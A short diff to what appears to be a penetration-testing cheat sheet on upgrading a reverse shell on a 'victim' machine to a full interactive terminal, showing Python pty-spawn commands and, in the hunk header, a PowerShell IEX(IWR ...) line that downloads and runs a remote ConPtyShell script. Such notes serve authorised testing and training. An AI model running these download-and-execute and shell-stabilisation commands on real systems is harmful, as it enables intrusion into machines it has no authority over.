@@ -217,7 +217,8 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 ```bash
 # Step 1: Spawn PTY on victim
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-# or: python -c, script -qc /bin/bash /dev/null
+# or: python2 
+python -c 'import pty;pty.spawn("/bin/bash")'
 
 # Step 2: Background the shell
 Ctrl+Z
